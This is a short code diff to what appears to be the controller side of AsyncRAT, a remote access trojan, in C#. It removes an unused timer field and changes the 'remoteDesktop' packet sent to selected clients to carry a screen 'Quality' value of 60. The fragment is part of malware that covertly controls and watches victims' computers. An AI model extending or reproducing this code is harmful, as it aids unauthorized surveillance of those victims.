@@ -34,7 +34,6 @@ namespace AsyncRAT_Sharp
 
         private Listener listener;
         private bool trans;
-        private static System.Threading.Timer tick;
 
         private void CheckFiles()
         {
@@ -336,7 +335,7 @@ namespace AsyncRAT_Sharp
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                    msgpack.ForcePathObject("Option").AsString = "true";
+                    msgpack.ForcePathObject("Quality").AsInteger = 60;
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
